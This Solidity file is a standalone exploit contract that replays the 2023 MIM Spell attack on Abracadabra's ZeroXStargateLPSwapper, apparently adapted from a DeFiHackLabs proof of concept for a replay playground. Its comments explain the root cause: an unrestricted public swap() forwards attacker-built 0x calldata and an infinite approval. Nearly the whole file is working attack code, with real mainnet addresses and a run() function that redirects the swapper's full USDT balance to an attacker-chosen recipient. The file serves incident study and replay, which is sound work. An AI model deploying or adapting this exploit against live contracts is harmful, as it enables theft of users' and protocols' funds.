// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-06-MIMSpell).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (MIMTest.testTransaction(); attacker == address(this) for the deposit/swap
// calls, with the actual profit landing on a SEPARATE `exploiter` EOA that only
// supplies the initial 3 SUSDT seed via a pranked approval). This is a faithful,
// self-contained copy of that inline attack (testTransaction body -> run()) so
// the playground can deploy it and record run(). Logic and constants are copied
// verbatim from test/MIMSpell_exp.sol.
//
// Root cause: Abracadabra/MIM's ZeroXStargateLPSwapper.swap() is public, has no
// caller/allowlist check, and forwards fully attacker-supplied `swapData` bytes
// verbatim to a hardcoded 0x Exchange Proxy via a raw external call. The
// constructor grants that proxy an infinite (type(uint256).max) approval on the
// swapper's underlying token (USDT). Because `swapData` encodes the 0x
// `sellToLiquidityProvider` call with an attacker-chosen `recipient`, anyone can
// make the proxy spend the swapper's ENTIRE USDT balance (not just the amount
// just redeemed) and route the output MIM to their own address instead of back
// to the swapper. The attacker seeds a trivial 3 USDT-equivalent Stargate LP
// deposit only so the swap() call has a nonzero shareFrom to redeem and doesn't
// revert; the real prize is the swapper's ~17,975 USDT residual balance left
// over from a prior liquidation.

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IDegenBox {
    function deposit(
        address token_,
        address from,
        address to,
        uint256 amount,
        uint256 share
    ) external returns (uint256 amountOut, uint256 shareOut);
}

interface ISwapper {
    function swap(
        address from,
        address to,
        address recipient,
        uint256 shareToMin,
        uint256 shareFrom,
        bytes calldata swapData
    ) external;
}

contract MIMSpellDrain {
    address CurveAddress = 0x5a6A4D54456819380173272A5E8E9B9904BdF41B;
    bytes4 CurveFunctionSelector = bytes4(keccak256(bytes("exchange_underlying(int128,int128,uint256,uint256)")));
    int128 FromCoinIdx = 3;
    int128 ToCoinIdx = 0;

    // Stargate Tether USD Token
    IERC20Like SUSDT = IERC20Like(0x38EA452219524Bb87e18dE1C24D3bB59510BD783);
    // Magic Internet Money Token
    IERC20Like MIM = IERC20Like(0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3);
    IERC20Like USDT = IERC20Like(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IDegenBox DegenBox = IDegenBox(0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce);
    ISwapper ZeroXStargateLPSwapper = ISwapper(0xa5564a2d1190a141CAC438c9fde686aC48a18A79);
    address private constant curveLiquidityProvider = 0x561B94454b65614aE3db0897B74303f4aCf7cc75;

    // recipient of the drained MIM (the historical `exploiter` EOA in the
    // original test; the constructor's caller-controlled `data` blob hardcodes
    // this address as the 0x `sellToLiquidityProvider` recipient argument).
    address public immutable recipient;

    constructor(address _recipient) {
        recipient = _recipient;
    }

    // Entrypoint mirrors MIMTest.testTransaction(). In the original test, the
    // 3 SUSDT is pulled from `exploiter` via transferFrom (a pranked approval
    // granted in setUp()); here the exploit contract is simply pre-funded with
    // 3 SUSDT directly (via config `setup.dealToken`), so no prank/approve dance
    // is needed — SUSDT.transferFrom(exploiter, address(this), 3e6) collapses to
    // "the exploit contract already holds 3e6 SUSDT" and the first line below
    // is dropped.
    function run() external {
        SUSDT.approve(address(DegenBox), type(uint256).max);
        DegenBox.deposit(address(SUSDT), address(this), address(ZeroXStargateLPSwapper), 0, 2_400_000);

        // Creating swapData which will be used for calling the 0x proxy inside
        // the vulnerable swap() function.
        bytes memory auxiliaryDatas = abi.encode(CurveAddress, CurveFunctionSelector, FromCoinIdx, ToCoinIdx);
        bytes memory data = abi.encodeWithSignature(
            "sellToLiquidityProvider(address,address,address,address,uint256,uint256,bytes)",
            address(USDT), // inputToken
            address(MIM), // outputToken
            curveLiquidityProvider, // provider
            recipient, // recipient — attacker-controlled, NOT the swapper
            USDT.balanceOf(address(ZeroXStargateLPSwapper)), // sellAmount — the swapper's FULL balance
            16_716_883_658_670_000_000_000, // minBuyAmount
            auxiliaryDatas // auxiliaryData
        );

        // By making a call to the 0x Exchange Proxy inside swap() with
        // attacker-supplied `data`, the swapper's infinite USDT approval is
        // spent to buy MIM that is routed directly to `recipient` instead of
        // back to the swapper.
        ZeroXStargateLPSwapper.swap(address(this), address(this), address(this), 0, 1_920_000, data);
    }
}
